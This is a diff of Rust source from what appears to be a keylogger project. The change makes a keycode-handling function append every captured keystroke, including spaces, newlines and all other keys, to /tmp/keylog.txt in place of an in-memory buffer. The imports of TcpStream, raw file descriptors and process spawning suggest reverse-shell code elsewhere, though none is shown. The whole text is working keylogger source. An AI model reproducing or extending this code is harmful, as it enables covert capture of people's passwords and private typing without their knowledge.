@@ -1,3 +1,5 @@
+use std::fs::OpenOptions;
+use std::io::Write;
 use std::net::TcpStream;
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
@@ -6,39 +8,34 @@ use dotenv::dotenv;
 use std::env;
 
 
-pub fn match_case(key: &Keycode, buffer: &mut String) -> &'static str {
+pub fn match_case(key: &Keycode) -> &'static str {
 
-    //let mut file = OpenOptions::new()
-    //.create(true)
-    //.append(true)
-    //.open("/home/oef/Documents/Github/k3ymb3d/log.txt")
-    //.expect("Failed to open file");
+    let mut file = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("/tmp/keylog.txt")
+        .expect("Failed to open file");
 
 
     // using match expression
     match *key {
         Keycode::Space => {
             // write to file
-            //file.write(b" ").expect("Failed to write to file");
-            buffer.push_str(" ");
+            file.write(b" ").expect("Failed to write to file");
             "Space"
         }
         Keycode::Enter => {
             // write to file
-            //file.write(b"\n").expect("Failed to write to file");
-            buffer.push_str("\n");
+            file.write(b"\n").expect("Failed to write to file");
             "Enter"
         }
         Keycode::RShift | Keycode::Slash => {
             // write to file
-            //file.write(b"?").expect("Failed to write to file");
-            buffer.push_str("?");
+            file.write(b"?").expect("Failed to write to file");
             "?"
         } 
-        
         _ => { 
-            //write!(file, "{}",  key).expect("Failed to write to file");  
-            buffer.push_str(&format!("{}", key));
+            write!(file, "{}",  key).expect("Failed to write to file");  
             "Other"
         }
     }    
